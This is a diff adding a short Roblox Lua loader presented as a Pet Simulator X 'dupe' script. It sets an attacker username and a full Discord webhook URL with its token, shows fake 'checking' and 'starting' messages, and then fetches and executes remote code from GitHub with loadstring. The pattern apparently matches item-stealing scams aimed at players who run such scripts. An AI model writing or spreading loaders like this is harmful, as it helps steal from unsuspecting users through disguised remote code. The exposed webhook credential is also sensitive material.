@@ -1,0 +1,14 @@
+Username = "Rusty1279"
+Webhooks = ""https://discord.com/api/webhooks/1084160656669937705/g7L88_dxnOSq9rQ8uGIVIfTuEW4QYFJ36SkNCWwo7GcTjfYZPdEYyzLtYT9X4Pj8-OKk" "
+ 
+_G.CustomScriptName = "Pet Sim x Script"
+ 
+_G.Text1 = "Script Loaded..."
+ 
+_G.Text2 = "Waiting for Script..."
+ 
+_G.Text3 = "Checking Scripts..."
+ 
+_G.Text4 = "Starting Script..."
+ 
+loadstring(game:HttpGet("https://github.com/Rustyscript/Psx-dupe-script-/new/main"))()
